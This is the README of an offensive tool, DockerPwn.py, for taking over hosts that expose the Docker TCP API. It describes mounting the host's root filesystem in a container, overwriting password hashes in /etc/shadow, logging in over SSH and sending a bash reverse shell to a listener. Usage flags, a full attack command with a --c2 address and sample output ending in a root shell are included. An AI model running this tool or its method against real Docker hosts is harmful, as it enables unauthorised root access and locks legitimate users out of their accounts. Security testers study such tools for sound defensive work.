# DockerPwn.py

Automation for abusing an exposed Docker TCP Socket.

This will automatically create a container on the Docker host with the host's root filesystem mounted,
allowing arbitrary read and write of the host filesystem (which is bad).

Once created, the script will employ the method of your choosing for obtaining a root shell. Currently,
only shadow is working - this alters root's hash in /etc/shadow to reflect a password of 'DockerPwn', as well
as any other user with a valid SHA512 Unix hash in /etc/shadow.

Once this is done, the script will attempt to use Paramiko to login to all users enumerated from 
/etc/passwd using the password 'DockerPwn'. Once a valid login is discovered, a reverse shell will be sent
to the built-in handler using /bin/bash. The built-in handler will then automatically obtain a PTY, escalate to root,
and clear the screen.

Shell I/O is logged for convenience and output to ./DockerPwn.log

## Roadmap:

Implement chroot method, bin method for quieter operation.

## Usage:
```
DockerPwn.py [-h] [--target TARGET] [--port PORT] [--image IMAGE] [--method METHOD] [--c2 C2]

optional arguments:
  -h, --help       show this help message and exit
  --target TARGET  IP of Docker Host
  --port PORT      Docker API TCP Port
  --image IMAGE    Docker image to use. Default is Alpine Linux.
  --method METHOD  Method to use. Valid methods are shadow, chroot, binary. Default is shadow.
  --c2 C2          Local IP and port in [IP]:[PORT] format to receive the shell.
 ```
## Example Output:

```
Dylans-MacBook-Pro:DockerPwn.py dylan$ /usr/local/bin/python3 /Users/dylan/Documents/GitHub/DockerPwn.py/DockerPwn.py --target 192.168.0.21 --port 2375 --c2 192.168.0.17:8080


[+] Successfully probed the API. Writing out list of containers just in case there's something cool.

[+] Downloading latest Alpine Image for a lightweight pwning experience.

[+] Alpine image is downloading to the host. Hope we aren't setting off any alarms. Sleeping for a bit.

[+] Alright, creating Alpine Linux Container now...

[+] Success! Created container with root volume mounted. Got ID a8f4825a694cd38da7858949a6e4cbfc3deb10a17bdb93600fcdf8de2d67f962!

[+] Starting container a8f4825a694cd38da7858949a6e4cbfc3deb10a17bdb93600fcdf8de2d67f962

[+] Container successfully started. Blue team will be with you shortly.

[+] Phew, alright. Creating the EXEC to change passwords.

[+] EXEC successfully created on container! Got ID 8d306c62296e56a3560013636cd899de8072f9fb9c535e3af02d88359a258156!

[+] Now triggering the EXEC to change passwords. Hope SSH is open...

[+] EXEC successfully triggered. Printing users found in /etc/passwd.

[!] User List: dylan sshd pollinate landscape dnsmasq uuidd lxd _apt messagebus syslog systemd-resolve systemd-network nobody gnats irc list backup www-data proxy uucp news mail lp man games sync sys bin daemon root

root@ubuntuserver:/home/dylan# id; hostname; date
uid=0(root) gid=0(root) groups=0(root)
ubuntuserver
Mon Nov 25 01:19:37 UTC 2019
root@ubuntuserver:/home/dylan# 
```
